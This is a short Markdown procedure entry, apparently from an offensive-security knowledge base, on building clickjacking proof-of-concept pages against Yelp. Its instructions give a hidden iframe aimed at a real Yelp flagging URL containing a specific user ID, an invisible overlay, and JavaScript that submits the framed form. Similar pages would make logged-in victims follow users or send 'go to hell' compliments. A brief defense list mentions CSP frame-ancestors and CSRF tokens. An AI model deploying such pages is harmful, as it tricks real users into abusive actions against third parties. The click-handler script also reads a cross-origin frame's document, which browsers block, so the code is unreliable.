---
tags:
  - clickjacking
  - poc
  - web
  - html
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
platforms:
  - Web
techniques:
  - '[[Drive-by Compromise]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: dbfbab4c-8df4-4b42-bc85-a6a78b1128ae
created_at: '2025-12-14T17:28:05.218Z'
updated_at: '2025-12-14T17:28:05.218Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Create-Proof-of-Concept-Malicious-Pages-for-Yelp-Clickjacking

## Summary

This procedure develops HTML-based proof-of-concept pages that embed vulnerable Yelp endpoints in hidden iframes, using overlays to trick users into clicking and triggering actions like abusive flagging or malicious compliments.

## Description

In the attack scenario, a malicious site hosts HTML files with invisible iframes loading Yelp actions; JavaScript captures clicks on overlaid elements to submit forms invisibly. Targets are authenticated Yelp users visiting the site. Prerequisites: Verified endpoints. Outcomes: Pages that coerce actions, e.g., flagging with 'This person is abusive' or complimenting with 'go to hell', bypassing CSRF via user session.

## Requirements

1. Text editor for HTML/JavaScript
2. Local server to host files (e.g., Python http.server)
3. Authenticated Yelp session for testing

## Defense

Defensive measures and detection strategies:

- Add frame-ancestors CSP to block external embedding
- Implement CSRF tokens on actions even in iframes
- Educate users on suspicious links and overlay detection

## Objectives

1. Build functional POCs for each vulnerable action
2. Simulate user deception via hidden elements
3. Enable demonstration of impact

## Instructions

### Step 1: Structure the HTML

**Context**: Set up iframe and overlay for a specific action.

For Report_a_USER.html: Include <iframe id="yelpframe" src="https://www.yelp.com/flag_content?message=This%20person%20is%20abusive&flag_id=aV0sVlYtxt7_2SJ7X_b-3A&flag_type=user_profile&previous_url=%2Fuser_details%3Fuserid%3DaV0sVlYtxt7_2SJ7X_b-3A" style="position:absolute; top:0; left:0; width:800px; height:600px; opacity:0; z-index:1;"></iframe> and an overlay div with z-index:2.

### Step 2: Add Click Handler

**Context**: Use JavaScript to submit the iframe form on overlay click.

Add <script>document.getElementById('overlay').onclick = function() { document.getElementById('yelpframe').contentWindow.document.forms[0].submit(); };</script> to trigger the action.

### Step 3: Repeat for Other POCs

**Context**: Create similar files for following and compliments.

For Follow_User.html: Iframe /following_user/add?dst_user_id=...; for Send_a_Compliment.html: /thanx?message=go%20to%20hell&user_id=.... Test each by clicking while logged in.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[clickjacking]]
- [[proof-of-concept]]
